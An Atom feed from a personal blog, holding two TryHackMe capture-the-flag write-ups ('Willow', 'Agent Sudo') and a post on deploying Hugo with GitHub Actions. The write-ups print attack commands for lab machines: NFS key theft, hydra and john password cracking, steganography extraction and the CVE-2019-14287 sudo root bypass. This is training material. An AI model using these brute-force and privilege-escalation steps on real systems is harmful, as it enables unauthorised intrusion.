<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><title type="text">Davis Freimanis</title><subtitle type="html">Davis Freimanis blog</subtitle><updated>2020-05-15T14:36:05+00:00</updated><id>https://davisfreimanis.github.io/</id><link rel="alternate" type="text/html" href="https://davisfreimanis.github.io/"/><link rel="self" type="application/atom+xml" href="https://davisfreimanis.github.io/atom.xml"/><author><name>Davis Freimanis</name><uri>https://davisfreimanis.github.io/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><generator uri="https://gohugo.io/" version="0.68.3">Hugo</generator><entry><title type="text">Willow</title><link rel="alternate" type="text/html" href="https://davisfreimanis.github.io/posts/hacking/writeups/willow/"/><id>https://davisfreimanis.github.io/posts/hacking/writeups/willow/</id><updated>2020-05-15T14:36:03+00:00</updated><published>2020-05-14T07:45:19+02:00</published><author><name>Davis Freimanis</name><uri>https://davisfreimanis.github.io/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">This was a very fun room that required a wide variety of skills ranging from cryptography to steganography.
Enumeration As always we start with enumeration of the open ports by running nmap -sV -sC -vv | tee nmap.txt. This gave us the following output.</summary><content type="html"><![CDATA[<p><img src="/images/willow/willow.png" alt="Willow"></p>
<p>This was a very fun room that required a wide variety of skills ranging from cryptography to steganography.</p>
<h2 id="enumeration">Enumeration</h2>
<p>As always we start with enumeration of the open ports by running <code>nmap -sV -sC -vv | tee nmap.txt</code>. This gave us the following output.</p>
<p><img src="/images/willow/nmap.png" alt="nmap output"></p>
<h2 id="nfs">NFS</h2>
<p>We see that the port <code>2049</code> is open which is running <code>nfs</code>. We can use a tool called <code>showmount</code> to enumerate mountable shares by issuing the command <code>showmount -e $IP</code>. This returns with <code>/var/failsafe *</code> meaning that we should be able to mount this directory.</p>
<p>Mounting in Linux can be done with <code>mount -t nfs $IP:/var/failsafe &lt;destination folder&gt;</code>. In this case we need to create a directory where we will mount such as <code>/tmp/willow</code>. We can now go to this mounted directory and find a file called <code>rsa_keys</code> with the content:</p>
<pre><code>Public Key Pair: (23, 37627)
Private Key Pair: (&lt;REDACTED&gt;, 37627)
</code></pre><p>When we are done we can unmount by running <code>umount /tmp/willow</code>.</p>
<h2 id="cryptography">Cryptography</h2>
<p>Moving on we open a web-browser and open up the page that is hosted on port 80. This returns a bunch of characters.</p>
<p><img src="/images/willow/page.png" alt="Web-site content"></p>
<p>Upon closer inspection it seems to be hex encoded. This is a task for one of my faviorite online tools <a href="https://gchq.github.io/CyberChef/">CyberChef</a>. When we use the <em>From Hex</em> recipe we get the following output:</p>
<p><img src="/images/willow/cyberchef.png" alt="CyberChef"></p>
<p>It looks like we have found an RSA key, but it seems to be encrypted. Remember the <code>rsa_keys</code> that we found in the <code>nfs</code> share? We could use those numbers to decrypt the ssh-key.</p>
<p>This is a textbook example of RSA encryption and can be decrypted with only a few lines of code. Let&rsquo;s first remember how RSA works:</p>
<p>$$e=c^d \mod n$$
$$d=c^e \mod n$$</p>
<p>where:</p>
<ul>
<li>$e$ is the public key exponent</li>
<li>$d$ is the private key exponent</li>
<li>$c$ is the plaintext or ciphertext</li>
<li>$n$ is the modulus</li>
</ul>
<p>With the following Pythoncode the RSA cipher could be decrypted to an SSH-key.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">n</span> <span class="o">=</span> <span class="mi">37627</span>
<span class="n">d</span> <span class="o">=</span> <span class="o">&lt;</span><span class="n">REDACTED</span><span class="o">&gt;</span>
<span class="n">plaintext</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;input.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">x</span><span class="p">:</span>
            <span class="n">plaintext</span> <span class="o">=</span> <span class="n">plaintext</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">**</span><span class="n">d</span><span class="o">%</span><span class="n">n</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="cracking">Cracking</h2>
<p>It seems like the SSH-key is password-protected. Let&rsquo;s use $john$ to crack the password. We can use the john module <code>ssh2john</code> to convert the key to a format that john can use:</p>
<p><code>python /usr/share/john/ssh2john.py key.txt &gt; hash</code></p>
<p>Next we run john with a wordlist:</p>
<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash</code></p>
<p>Pretty fast we have a password that we can use to login with the SSH-key.</p>
<h2 id="user-flag">User Flag</h2>
<p>Before we can use the SSH-key we must change the permissions <code>chmod 600 id_rsa</code>. Next we can login as the user <code>willow</code> with <code>ssh -i id_rsa willow@$IP</code>.</p>
<p>There is a file called <code>user.jpg</code> that we can download to our computer with <code>scp -i id_rsa willow@$IP:~/user.jpg</code>. Opening the file <code>eog user.jpg</code> reveals the flag.</p>
<p><img src="/images/willow/flag.png" alt="Flag"></p>
<h2 id="root-flag">Root Flag</h2>
<p>The first thing we can do is to run <code>sudo -l</code> to find out that we can run <code>/bin/mount /dev/*</code> without a password. When we check the directory there is a unmounted directory <code>hidden_backup</code> which looks interesting.</p>
<p>Let&rsquo;s first create a directory where we can mount <code>mkdir -p /tmp/directory</code>
We mount using <code>sudo /bin/mount /dev/hidden_backup /tmp/directory</code></p>
<p>In the mount we find <code>creds.txt</code>:</p>
<pre><code>willow: &lt;REDACTED&gt;
root: &lt;REDACTED&gt;
</code></pre><p>Login as root <code>su root</code> where we find a file <code>root.txt</code> with the following text:</p>
<pre><code>This would be too easy, don't you think? I actually gave you the root flag some time ago. You've got my password now -- go find your flag!
</code></pre><p>Let&rsquo;s check if there is anything hidden in the <code>user.jpg</code> file that we got for the user flag. Using <code>steghide</code> we can extract information with:</p>
<p><code>steghide extract -sf user.jpg</code></p>
<p>After inputing the root password we get the root flag!</p>
]]></content><category scheme="https://davisfreimanis.github.io/categories/writeups/" term="Writeups" label="Writeups"/><category scheme="https://davisfreimanis.github.io/tags/tryhackme/" term="tryhackme" label="tryhackme"/><category scheme="https://davisfreimanis.github.io/tags/nfs/" term="nfs" label="nfs"/><category scheme="https://davisfreimanis.github.io/tags/cracking/" term="cracking" label="cracking"/><category scheme="https://davisfreimanis.github.io/tags/steganography/" term="steganography" label="steganography"/><category scheme="https://davisfreimanis.github.io/tags/rsa/" term="rsa" label="rsa"/></entry><entry><title type="text">Agent Sudo</title><link rel="alternate" type="text/html" href="https://davisfreimanis.github.io/posts/hacking/writeups/agent-sudo/"/><id>https://davisfreimanis.github.io/posts/hacking/writeups/agent-sudo/</id><updated>2020-05-15T14:36:03+00:00</updated><published>2020-05-09T10:17:19+02:00</published><author><name>Davis Freimanis</name><uri>https://davisfreimanis.github.io/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">This room can be found at Tryhackme. It is a pretty simple and fun room that requires the knowlege of a few password cracking tools and privelege escalation.
Enumerate Run nmap with nmap -sV -sC -vv $IP | tee nmap.txt and we see that we have three ports open: 21, 22 and 80.</summary><content type="html"><![CDATA[<p><img src="/images/agent-sudo.png" alt="asdf"></p>
<p>This room can be found at <a href="https://tryhackme.com/room/agentsudoctf">Tryhackme</a>. It is a pretty simple and fun room that requires the knowlege of a few password cracking tools and privelege escalation.</p>
<h2 id="enumerate">Enumerate</h2>
<p>Run <code>nmap</code> with <code>nmap -sV -sC -vv $IP | tee nmap.txt</code> and we see that we have three ports open: 21, 22 and 80.</p>
<pre><code>PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><p>Change the user agent to <code>C</code> and get redirected to a page <code>$IP/agent_C_attention.php</code>. We get the information that the user is called <code>chris</code>.</p>
<pre><code>Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R
</code></pre><h2 id="hash-cracking-and-brute-force">Hash Cracking and Brute-Force</h2>
<p>We now have a user and know that the password should be weak. Let&rsquo;s start with FTP.</p>
<h3 id="ftp">FTP</h3>
<p><code>ftp</code> can be cracked with <code>Hydra</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">hydra -l chris -P /usr/share/wordlists/users/100_common_passwords.txt -vV <span class="nv">$IP</span> ftp
</code></pre></td></tr></table>
</div>
</div><p>Password not found. Let&rsquo;s test a bigger list:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">hydra -l chris -P /usr/share/wordlists/users/1000_common_passwords.txt -vV <span class="nv">$IP</span> ftp
</code></pre></td></tr></table>
</div>
</div><p>Password found!</p>
<p>Use <code>ftp $IP</code> to connect to the <code>ftp</code> server and download the files using <code>get &lt;file&gt;</code>.</p>
<h3 id="zip">ZIP</h3>
<p>Running <code>strings cutie.png</code> reveals that there is something in the file.</p>
<p>We run <code>binwalk -e cutie.png</code> to extract all embedded files. We find a password protected ZIP file called <code>8702.zip</code>. We can use <code>john</code> to crack the password.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">zip2john 8702.zip &gt; hash.txt
john hash.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
</code></pre></td></tr></table>
</div>
</div><p>Password found!</p>
<p>The file <code>To_agentR.txt</code> now has content:</p>
<pre><code>Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
</code></pre><h3 id="steganography">Steganography</h3>
<p>Decode the string with base64: <code>echo QXJlYTUx | base64 -d</code>.</p>
<p>Use <code>steghide</code> to find hidden message in <code>cute_alien.jpg</code>.</p>
<p><code>steghide extract -sf cute_alien.jpg</code></p>
<pre><code>Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
</code></pre><p>We now have a password for the user <code>james</code> and can login with <code>ssh</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">ssh james@<span class="nv">$IP</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="privlege-escalation">Privlege Escalation</h2>
<p>We upload <code>LinEnum.sh</code> to the remote server.</p>
<pre><code>[-] Sudo version:
Sudo version 1.8.21p2
</code></pre><p>We find that there is a vulnerability for the <code>sudo</code> version <code>CVE-2019-14287</code>.</p>
<p><code>sudo -l</code> reveals that <code>james</code> can run the command <code>/bin/bash</code> as any user but <code>root</code> which seems fine.</p>
<pre><code>User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
</code></pre><p>However, the vulnerability is that if we specify a user ID such as <em>-1</em>, it will run as the id <em>0</em> which is the root user.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">sudo -u#-1 /bin/bash
</code></pre></td></tr></table>
</div>
</div><p>This gives us <code>root</code> and we can find the root flag!</p>
]]></content><category scheme="https://davisfreimanis.github.io/categories/writeups/" term="Writeups" label="Writeups"/><category scheme="https://davisfreimanis.github.io/tags/tryhackme/" term="tryhackme" label="tryhackme"/><category scheme="https://davisfreimanis.github.io/tags/sudo/" term="sudo" label="sudo"/><category scheme="https://davisfreimanis.github.io/tags/cracking/" term="cracking" label="cracking"/></entry><entry><title type="text">Deploying a Hugo Website Using Github Actions</title><link rel="alternate" type="text/html" href="https://davisfreimanis.github.io/posts/hugo-github-actions/"/><id>https://davisfreimanis.github.io/posts/hugo-github-actions/</id><updated>2020-05-15T14:36:03+00:00</updated><published>2020-05-05T15:04:12+02:00</published><author><name>Davis Freimanis</name><uri>https://davisfreimanis.github.io/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">This blog uses Hugo to serve static pages. To make deploying posts easy, I am using Github Actions for automatic deployment. This post will present how it works.
Github Actions My Github repository contains two branches. Everything that exists in the master branch is automatically published using Github Pages.</summary><content type="html"><![CDATA[<p>This <a href="https://github.com/davisfreimanis/davisfreimanis.github.io">blog</a> uses Hugo to serve static pages. To make deploying posts easy, I am using Github Actions for automatic deployment. This post will present how it works.</p>
<h2 id="github-actions">Github Actions</h2>
<p>My Github repository contains two branches. Everything that exists in the <code>master</code> branch is automatically published using Github Pages. To separate source code with optimized Hugo pages, I&rsquo;m adding content and modifying the style of the blog in a separate branch <code>source</code>.</p>
<p>The magic is how the code gets deployed from the <code>source</code> branch to <code>master</code>. This is done with Github Actions and the configuration file is shown below.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="k">name</span><span class="p">:</span><span class="w"> </span>Github<span class="w"> </span>Pages<span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">on</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="k">push</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="k">branches</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span>source<span class="w"> </span><span class="p">]</span><span class="w">
</span><span class="w">  </span><span class="k">pull_request</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="k">branches</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span>source<span class="w"> </span><span class="p">]</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="k">jobs</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="k">build</span><span class="p">:</span><span class="w">
</span><span class="w">    </span><span class="k">runs-on</span><span class="p">:</span><span class="w"> </span>ubuntu<span class="m">-18.04</span><span class="w">
</span><span class="w">    </span><span class="k">steps</span><span class="p">:</span><span class="w">
</span><span class="w">    </span>- <span class="k">uses</span><span class="p">:</span><span class="w"> </span>actions/checkout@v2<span class="w"> </span><span class="c"># Fetches commits</span><span class="w">
</span><span class="w">      </span><span class="k">with</span><span class="p">:</span><span class="w">
</span><span class="w">        </span><span class="k">submodules</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">  </span><span class="c"># Fetches Hugo themes</span><span class="w">
</span><span class="w">        </span><span class="k">fetch-depth</span><span class="p">:</span><span class="w"> </span><span class="m">0</span><span class="w">    </span><span class="c"># Fetch all history for .GitInfo and .Lastmod</span><span class="w">
</span><span class="w">
</span><span class="w">    </span>- <span class="k">name</span><span class="p">:</span><span class="w"> </span>Setup<span class="w">
</span><span class="w">      </span><span class="k">uses</span><span class="p">:</span><span class="w"> </span>peaceiris/actions-hugo@v2<span class="w">
</span><span class="w">      </span><span class="k">with</span><span class="p">:</span><span class="w">
</span><span class="w">        </span><span class="k">hugo-version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;0.68.3&#39;</span><span class="w">
</span><span class="w">        </span><span class="k">extended</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="c"># For SCSS support in theme</span><span class="w">
</span><span class="w">
</span><span class="w">    </span>- <span class="k">name</span><span class="p">:</span><span class="w"> </span>Build<span class="w">
</span><span class="w">      </span><span class="k">run</span><span class="p">:</span><span class="w"> </span>hugo<span class="w"> </span>--minify<span class="w">
</span><span class="w">
</span><span class="w">    </span>- <span class="k">name</span><span class="p">:</span><span class="w"> </span>Deploy<span class="w">
</span><span class="w">      </span><span class="k">uses</span><span class="p">:</span><span class="w"> </span>peaceiris/actions-gh-pages@v3<span class="w">
</span><span class="w">      </span><span class="k">with</span><span class="p">:</span><span class="w">
</span><span class="w">        </span><span class="k">github_token</span><span class="p">:</span><span class="w"> </span>${{<span class="w"> </span>secrets.GITHUB_TOKEN<span class="w"> </span>}}<span class="w">
</span><span class="w">        </span><span class="k">publish_dir</span><span class="p">:</span><span class="w"> </span>./public<span class="w">
</span><span class="w">        </span><span class="k">publish_branch</span><span class="p">:</span><span class="w"> </span>master<span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>This configuration file defines when and how Github Actions will run. It monitors the <code>source</code> branch and will run everytime a new commit or pull request is pushed is detected.</p>
<p>The next thing that happens is that a virtual machine is created running <code>Ubuntu 18.04</code>.</p>
<p>There are three Github Actions that are used on this virtual machine:</p>
<ul>
<li><a href="https://github.com/actions/checkout">checkout</a></li>
<li><a href="https://github.com/peaceiris/actions-hugo">actions-hugo</a></li>
<li><a href="https://github.com/peaceiris/actions-gh-pages">actions-gh-pages</a></li>
</ul>
<p>The first action <code>checkout</code> fetches the code from the <code>source</code> branch.</p>
<p>Next <code>actions-hugo</code> installs Hugo and builds the source code and generates the <code>public</code> folder.</p>
<p>The last action <code>actions-gh-pages</code> takes the public folder and pushes it to the master branch where my page is hosted using Github Pages.</p>
<p><img src="/images/hugo.jpg" alt="Hugo with Github Actions"></p>
]]></content><category scheme="https://davisfreimanis.github.io/tags/github-actions/" term="Github Actions" label="Github Actions"/></entry></feed>